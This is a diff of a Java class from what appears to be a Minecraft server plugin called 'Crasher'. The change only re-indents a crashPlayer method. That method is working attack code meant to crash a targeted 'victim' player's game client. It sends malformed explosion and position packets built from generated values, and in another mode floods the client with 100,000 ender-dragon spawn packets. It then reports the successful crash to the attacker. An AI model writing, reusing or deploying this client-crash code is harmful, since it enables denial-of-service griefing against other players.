@@ -62,49 +62,49 @@ public class CrashUtils {
      * @param crashType The method you want to crash them with
      */
     public static void crashPlayer(CommandSender crasher, Player victim, CrashType crashType) throws Exception {
-            switch (crashType) {
-                case EXPLOSION:
-                    Object vec3d = vec3DConstructor.newInstance(
-                            d(), d(), d());
-                    Object explosionPacket = playOutConstructor.newInstance(
-                            d(), d(), d(), f(), Collections.emptyList(), vec3d);
+        switch (crashType) {
+            case EXPLOSION:
+                Object vec3d = vec3DConstructor.newInstance(
+                        d(), d(), d());
+                Object explosionPacket = playOutConstructor.newInstance(
+                        d(), d(), d(), f(), Collections.emptyList(), vec3d);
 
-                    sendPacket(victim, explosionPacket);
-                    break;
-                case POSITION:
-                    Object posPacket = playOutPositionConstructor.newInstance(
-                            d(), d(), d(), f(), f(), Collections.emptySet());
+                sendPacket(victim, explosionPacket);
+                break;
+            case POSITION:
+                Object posPacket = playOutPositionConstructor.newInstance(
+                        d(), d(), d(), f(), f(), Collections.emptySet());
 
-                    sendPacket(victim, posPacket);
-                    break;
-                case ENTITY:
-                    Location loc = victim.getLocation();
+                sendPacket(victim, posPacket);
+                break;
+            case ENTITY:
+                Location loc = victim.getLocation();
 
-                    Bukkit.getScheduler().runTaskAsynchronously(Crasher.getInstance(), () -> {
-                        for (int i = 0; i < 100000; i++) {
-                            Object craftWorld = craftWorldClass.cast(loc.getWorld());
-                            Object getHandle;
-                            Constructor<?> enderDragonConstructor;
-                            Object dragonEntity;
-                            Constructor<?> enderDragonPacketConstructor;
-                            Object enderDragonPacket;
+                Bukkit.getScheduler().runTaskAsynchronously(Crasher.getInstance(), () -> {
+                    for (int i = 0; i < 100000; i++) {
+                        Object craftWorld = craftWorldClass.cast(loc.getWorld());
+                        Object getHandle;
+                        Constructor<?> enderDragonConstructor;
+                        Object dragonEntity;
+                        Constructor<?> enderDragonPacketConstructor;
+                        Object enderDragonPacket;
 
-                            try {
-                                getHandle = craftWorld.getClass().getMethod("getHandle").invoke(craftWorld);
-                                enderDragonConstructor = entityEnderDragonClass.getConstructor(worldClass);
-                                dragonEntity = enderDragonConstructor.newInstance(getHandle);
-                                enderDragonPacketConstructor = packetPlayOutSpawnEntityLivingClass.getConstructor(entityLivingClass);
-                                enderDragonPacket = enderDragonPacketConstructor.newInstance(dragonEntity);
+                        try {
+                            getHandle = craftWorld.getClass().getMethod("getHandle").invoke(craftWorld);
+                            enderDragonConstructor = entityEnderDragonClass.getConstructor(worldClass);
+                            dragonEntity = enderDragonConstructor.newInstance(getHandle);
+                            enderDragonPacketConstructor = packetPlayOutSpawnEntityLivingClass.getConstructor(entityLivingClass);
+                            enderDragonPacket = enderDragonPacketConstructor.newInstance(dragonEntity);
 
-                                sendPacket(victim, enderDragonPacket);
-                            } catch (Exception e) {
-                                throw new RuntimeException(e);
-                            }
+                            sendPacket(victim, enderDragonPacket);
+                        } catch (Exception e) {
+                            throw new RuntimeException(e);
                         }
-                    });
-                    break;
-            }
-            crasher.sendMessage(Crasher.PREFIX + "§aCrashed §2" + victim.getName() + " §ausing the §3" + crashType.name() + " §amethod!");
+                    }
+                });
+                break;
+        }
+        crasher.sendMessage(Crasher.PREFIX + "§aCrashed §2" + victim.getName() + " §ausing the §3" + crashType.name() + " §amethod!");
     }
 
     /**
